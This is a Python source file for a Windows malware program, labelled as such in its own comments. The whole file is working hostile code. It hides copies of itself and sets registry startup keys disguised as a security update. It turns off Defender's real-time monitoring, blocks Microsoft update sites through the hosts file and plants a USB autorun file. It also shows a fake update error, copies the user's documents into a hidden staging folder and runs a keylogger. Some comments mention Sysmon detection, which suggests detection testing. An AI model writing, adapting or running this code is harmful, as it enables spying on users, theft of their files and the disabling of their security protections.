import os
import shutil
import logging
import winreg as reg
import subprocess
import sys
import time
from pynput import keyboard
import ctypes

# Define paths
MALWARE_PATH = "C:\\Windows\\Temp\\malware.exe"
SECONDARY_COPY = "C:\\Users\\Public\\malicious.exe"
USB_AUTORUN = "D:\\autorun.inf"
LOG_FILE = "C:\\Windows\\Temp\\log.txt"
STOLEN_FILES_DIR = "C:\\Windows\\Temp\\stolen_files"
PDF_TO_OPEN = "C:\\Users\\Public\\Documents\\fake.pdf"

# Ensure log file exists
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()
    os.system(f"attrib +h {LOG_FILE}")  # Hide the log file

# Ensure stolen files directory exists
if not os.path.exists(STOLEN_FILES_DIR):
    os.makedirs(STOLEN_FILES_DIR)

# Set up logging
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(message)s")

# Function to add to startup (Run + RunOnce keys)
def add_to_startup():
    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsSecurityUpdate", 0, reg.REG_SZ, MALWARE_PATH)
        reg.CloseKey(reg_key)

        key_once = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
        reg_key_once = reg.OpenKey(reg.HKEY_CURRENT_USER, key_once, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key_once, "MalwareExecution", 0, reg.REG_SZ, MALWARE_PATH)
        reg.CloseKey(reg_key_once)
    except Exception as e:
        print(f"[-] Error adding to startup: {e}")

# Function to disable Windows Defender (Sysmon detectable)
def disable_defender():
    try:
        subprocess.run(["powershell", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True)
    except Exception as e:
        print(f"[-] Error disabling Defender: {e}")

# Function to modify Hosts File (Detectable via Sysinternals)
def modify_hosts_file():
    try:
        with open(r"C:\Windows\System32\drivers\etc\hosts", "a") as f:
            f.write("\n127.0.0.1 www.microsoft.com")
            f.write("\n127.0.0.1 www.windowsupdate.com")
    except Exception as e:
        print(f"[-] Error modifying hosts file: {e}")

# Function to display a fake error message
def fake_error_message():
    ctypes.windll.user32.MessageBoxW(0, "Error 0x800F0922: Windows update failed!", "System Error", 0x10)

# Function to drop itself in another location
def copy_malware():
    try:
        shutil.copy(sys.argv[0], MALWARE_PATH)
        shutil.copy(sys.argv[0], SECONDARY_COPY)
        os.system(f"attrib +h {MALWARE_PATH}")  # Hide malware
    except Exception as e:
        print(f"[-] Error copying malware: {e}")

# Function to create USB autorun file (Suspicious USB behavior)
def create_usb_persistence():
    try:
        with open(USB_AUTORUN, "w") as f:
            f.write("[Autorun]\n")
            f.write(f"open={SECONDARY_COPY}\n")
            f.write("action=Open folder to view files")
    except Exception as e:
        print(f"[-] Error creating USB autorun: {e}")

# Function to execute fake PDF opener
def open_pdf():
    try:
        os.startfile(PDF_TO_OPEN)
    except Exception as e:
        print(f"[-] Error opening PDF: {e}")

# Function to steal documents from user directories
def steal_documents():
    try:
        target_dirs = [
            os.path.join(os.environ["USERPROFILE"], "Desktop"),
            os.path.join(os.environ["USERPROFILE"], "Documents"),
            os.path.join(os.environ["USERPROFILE"], "Downloads")
        ]
        
        file_extensions = [".docx", ".pdf", ".txt"]

        for directory in target_dirs:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        if any(file.endswith(ext) for ext in file_extensions):
                            source = os.path.join(root, file)
                            destination = os.path.join(STOLEN_FILES_DIR, file)
                            shutil.copy(source, destination)
    except Exception as e:
        print(f"[-] Error stealing documents: {e}")

# Start keylogger listener
def start_keylogger():
    try:
        with keyboard.Listener(on_press=lambda key: logging.info(str(key).replace("'", ""))) as listener:
            listener.join()
    except Exception as e:
        print(f"[-] Error in keylogger: {e}")

# Execute malware functionalities
copy_malware()
add_to_startup()
disable_defender()
modify_hosts_file()
create_usb_persistence()
fake_error_message()
open_pdf()
steal_documents()
start_keylogger()  # Blocking call; runs last
